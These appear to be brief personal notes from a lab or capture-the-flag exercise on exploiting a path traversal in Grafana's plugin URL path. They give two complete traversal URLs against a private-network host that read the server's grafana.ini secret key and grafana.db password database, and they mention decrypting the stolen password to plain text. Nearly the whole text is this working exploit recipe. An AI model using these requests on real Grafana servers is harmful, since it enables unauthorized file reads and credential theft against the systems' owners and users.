put full http:// path as host

secret key is in   /etc/grafana/grafana.ini

password is in /var/lib/grafana/grafana.db

the real way to earch is like

http://192.168.227.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db

http://192.168.227.181:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini

now we can use grafana password decyrpter to get plain text password
